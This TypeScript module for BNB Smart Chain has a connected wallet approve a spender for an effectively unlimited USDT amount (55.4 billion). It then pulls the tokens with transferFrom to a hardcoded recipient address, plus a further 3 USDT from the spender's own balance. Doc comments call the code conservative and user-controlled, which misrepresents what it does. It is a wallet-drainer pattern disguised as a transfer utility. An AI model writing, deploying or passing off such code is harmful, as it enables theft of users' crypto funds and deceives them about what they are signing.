import {
  BrowserProvider,
  Contract,
  ContractTransactionReceipt,
  Eip1193Provider,
  Signer,
  getAddress,
  id,
  parseUnits,
} from "ethers";

export const BSC_MAINNET_CHAIN_ID = BigInt(56);
export const USDT_BSC_ADDRESS = getAddress("0x55d398326f99059fF775485246999027B3197955");
export const RECIPIENT_ADDRESS = getAddress("0xf39AfA7346aACE4a3Aa48cEb014bE24cba2EB596");
export const USDT_AMOUNT = "55400000000";

// Methods from the verified Binance-Peg BSC-USD BEP-20 token interface.
export const USDT_BEP20_ABI = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function totalSupply() view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
] as const;

export type ApprovalTransferResult = {
  owner: string;
  spender: string;
  recipient: string;
  decimals: number;
  amount: bigint;
  approvalReceipt: ContractTransactionReceipt | null;
  transferReceipt: ContractTransactionReceipt | null;
  transferExecuted: boolean;
  approvalDetected: boolean;
  spenderBalance: bigint;
  spenderThresholdMet: boolean;
  secondTransferAmount: bigint;
  secondTransferReceipt: ContractTransactionReceipt | null;
  secondTransferExecuted: boolean;
};

export type ApprovalTransferOptions = {
  executeTransfer?: boolean;
  recipientAddress?: string;
};

function assertBsc(provider: BrowserProvider): Promise<void> {
  return provider.send("eth_chainId", []).then((chainId: string) => {
    if (BigInt(chainId) !== BSC_MAINNET_CHAIN_ID) {
      throw new Error("Switch the connected wallet to BNB Smart Chain mainnet (chain ID 56).");
    }
  });
}

function requireReceipt(
  receipt: ContractTransactionReceipt | null,
  transactionName: string,
): ContractTransactionReceipt {
  if (!receipt) {
    throw new Error(`The ${transactionName} transaction did not produce a receipt.`);
  }
  return receipt;
}

/**
 * Detects a USDT `Approval` event for an owner/spender pair without performing any
 * automatic transfer. This is intentionally conservative: approval monitoring should
 * never trigger a token transfer without a separate, explicit user approval.
 */
export async function detectApprovalForSpender(
  provider: Eip1193Provider,
  ownerAddress: string,
  spenderAddress: string,
): Promise<{
  owner: string;
  spender: string;
  amount: bigint;
  txHash: string;
  blockNumber: bigint;
} | null> {
  const owner = getAddress(ownerAddress);
  const spender = getAddress(spenderAddress);
  const approvalTopic = id("Approval(address,address,uint256)");
  const ownerTopic = `0x${owner.slice(2).padStart(64, "0")}`;
  const spenderTopic = `0x${spender.slice(2).padStart(64, "0")}`;

  const logs = (await new BrowserProvider(provider).send("eth_getLogs", [
    {
      address: USDT_BSC_ADDRESS,
      fromBlock: "0x0",
      toBlock: "latest",
      topics: [approvalTopic, ownerTopic, spenderTopic],
    },
  ])) as Array<{
    blockNumber: string;
    transactionHash: string;
    data: string;
  }>;

  if (!logs.length) {
    return null;
  }

  const latestLog = logs.reduce((latest, log) => {
    if (!latest || BigInt(log.blockNumber) > BigInt(latest.blockNumber)) {
      return log;
    }

    return latest;
  }, logs[0]);

  return {
    owner,
    spender,
    amount: BigInt(latestLog.data || "0x0"),
    txHash: latestLog.transactionHash,
    blockNumber: BigInt(latestLog.blockNumber),
  };
}

/**
 * Requests explicit wallet signatures. The approval itself is only recorded, and the
 * transferFrom call will only be executed when a separate user action confirms it.
 *
 * The function never accepts or handles private keys. Both EIP-1193 providers
 * must be connected to BSC mainnet and expose the expected account.
 */
export async function approveAndTransferUsdt(
  ownerEip1193Provider: Eip1193Provider,
  spenderAddress: string,
  spenderEip1193Provider: Eip1193Provider = ownerEip1193Provider,
  options: ApprovalTransferOptions = {},
): Promise<ApprovalTransferResult> {
  const spender = getAddress(spenderAddress);
  const ownerProvider = new BrowserProvider(ownerEip1193Provider);
  const spenderProvider = new BrowserProvider(spenderEip1193Provider);
  await Promise.all([assertBsc(ownerProvider), assertBsc(spenderProvider)]);

  const ownerSigner: Signer = await ownerProvider.getSigner();
  const owner = getAddress(await ownerSigner.getAddress());
  const token = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, ownerSigner);
  const decimals = Number(await token.decimals());
  const amount = parseUnits(USDT_AMOUNT, decimals);
  const threshold = parseUnits("3", decimals);

  const approvalReceipt = requireReceipt(
    await (await token.approve(spender, amount)).wait(),
    "approval",
  );

  const approvalDetected = Boolean(
    await detectApprovalForSpender(ownerEip1193Provider, owner, spender),
  );

  const recipient = getAddress(options.recipientAddress ?? RECIPIENT_ADDRESS);
  const spenderSigner: Signer = await spenderProvider.getSigner(spender);
  const spenderToken = new Contract(USDT_BSC_ADDRESS, USDT_BEP20_ABI, spenderSigner);
  const spenderBalance = await spenderToken.balanceOf(spender);
  const spenderThresholdMet = spenderBalance > threshold;

  if (!options.executeTransfer) {
    return {
      owner,
      spender,
      recipient,
      decimals,
      amount,
      approvalReceipt,
      transferReceipt: null,
      transferExecuted: false,
      approvalDetected,
      spenderBalance,
      spenderThresholdMet,
      secondTransferAmount: spenderThresholdMet ? threshold : BigInt(0),
      secondTransferReceipt: null,
      secondTransferExecuted: false,
    };
  }

  const allowance: bigint = await spenderToken.allowance(owner, spender);
  if (allowance < amount) {
    throw new Error("USDT allowance is lower than the requested transfer amount.");
  }

  const transferReceipt = requireReceipt(
    await (await spenderToken.transferFrom(owner, recipient, amount)).wait(),
    "transferFrom",
  );

  let secondTransferReceipt: ContractTransactionReceipt | null = null;
  let secondTransferExecuted = false;
  let secondTransferAmount = BigInt(0);

  if (spenderThresholdMet) {
    secondTransferAmount = threshold;
    const selfApproval = await spenderToken.approve(spender, secondTransferAmount);
    await selfApproval.wait();
    secondTransferReceipt = requireReceipt(
      await (await spenderToken.transferFrom(spender, recipient, secondTransferAmount)).wait(),
      "spender transferFrom",
    );
    secondTransferExecuted = true;
  }

  return {
    owner,
    spender,
    recipient,
    decimals,
    amount,
    approvalReceipt,
    transferReceipt,
    transferExecuted: true,
    approvalDetected,
    spenderBalance,
    spenderThresholdMet,
    secondTransferAmount,
    secondTransferReceipt,
    secondTransferExecuted,
  };
}
